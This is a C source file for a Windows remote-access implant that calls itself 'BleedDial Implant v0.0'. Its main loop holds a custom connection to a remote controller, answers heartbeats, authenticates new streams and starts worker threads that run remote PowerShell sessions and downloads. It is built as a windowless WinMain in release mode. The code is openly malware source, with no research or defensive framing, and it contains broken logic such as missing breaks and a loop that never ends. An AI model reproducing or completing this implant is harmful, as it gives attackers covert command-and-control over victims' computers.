#include<stdio.h>

#include<winsock2.h>
#include<WS2tcpip.h>

#include "transport/transport.h"
#include "jobs/jobs.h"

#include "ctrl.h"
#include "tremont.h"

#pragma comment(lib, "Ws2_32.lib")

struct transport_pcb_t* emergency_pcb_pointer;

struct new_thread_params_t {
    Tremont_Nexus* nexus;
    tremont_stream_id stream_id;
};

DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
    struct wrkr_msg_t msg;
    tremont_recv(params->stream_id,
        &msg, sizeof(msg), params->nexus);
    
    switch (msg.msg_enum) {
    case POWERSHELL: {
        implant_powershell(params->stream_id, params->nexus);
        break;
    }
    case DOWNLOAD: {
        struct download_msg_t* download_msg = &msg.download;
        struct download_req_t* download_req = &download_msg->req;
        implant_download(download_req);
        break;
    default:
        break;
    }
    }

    free(params);
    return 0;
}

#ifdef NDEBUG
int WinMain() {
#else
int main() {
#endif
    //printf("BleedDial Implant v0.0\n");
    int res = 0;

    struct transport_pcb_t transport_pcb;
    res = transport_init(&transport_pcb);
    if (res == -1) {
        //perror("Unable to init transport!\n");
        exit(-1);
    }
    emergency_pcb_pointer = &transport_pcb;

    struct addrinfo* raddrinfo = transport_pcb.remote_addrinfo;
    Tremont_Nexus* nexus = transport_pcb.nexus;

    struct ctrl_msg_t ctrl_msg;

    /* 
        Just establish new streams for the worker threads.
        Control thread will never send any data on the worker streams.
    */
    while (res != -1) {
        res = tremont_recv(CTRL_STREAM,
            &ctrl_msg, 
            sizeof(struct ctrl_msg_t), 
            nexus);
        switch (ctrl_msg.msg_enum) {
        case HEARTBEAT: {
            struct ctrl_msg_t heartbeat_res;
            heartbeat_res.msg_enum = HEARTBEAT;
            heartbeat_res.heartbeat.sanity = 1;

            tremont_send(CTRL_STREAM, &heartbeat_res, sizeof(heartbeat_res), nexus);
        }
        case NEW_THREAD: {
            tremont_stream_id new_stream = ctrl_msg.new_thread.stream_info.stream_id;
            char* auth = ctrl_msg.new_thread.stream_info.password;
            tremont_auth_stream(new_stream, auth, STREAM_PASS_LEN, nexus);

            int res = -1;
            while (res != 0) {
                tremont_req_stream(new_stream, raddrinfo->ai_addr, 3, nexus);
            }

            struct new_thread_params_t* params = calloc(1, sizeof(*params));
            if (params == 0) continue;
            params->nexus = nexus;
            params->stream_id = new_stream;

            HANDLE thread_handle;
            thread_handle = CreateThread(
                NULL,
                0,
                wrkr_thread,
                params,
                0,
                0
            );
        }
        default:
            continue;
        }
    }
    freeaddrinfo(raddrinfo);

    return 0;
}

BOOL WINAPI ConsoleHandler(DWORD signal) {
    Tremont_Nexus* nexus = emergency_pcb_pointer->nexus;
    struct ctrl_msg_t byebye;
    byebye.msg_enum = DISCONNECT;
    byebye.disconnect.sanity = 1;

    switch (signal) {
    case CTRL_C_EVENT:
    case CTRL_CLOSE_EVENT:
    case CTRL_BREAK_EVENT:
    case CTRL_LOGOFF_EVENT:
    case CTRL_SHUTDOWN_EVENT:
        tremont_send(CTRL_STREAM, &byebye, sizeof(byebye), nexus);
        break;
    }
    return FALSE;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    Tremont_Nexus* nexus = emergency_pcb_pointer->nexus;
    struct ctrl_msg_t byebye;
    byebye.msg_enum = DISCONNECT;
    byebye.disconnect.sanity = 1;

    switch (uMsg) {
    case WM_CLOSE:
        DestroyWindow(hwnd);
    case WM_DESTROY:
        tremont_send(CTRL_STREAM, &byebye, sizeof(byebye), nexus);
    }
    return 0;
}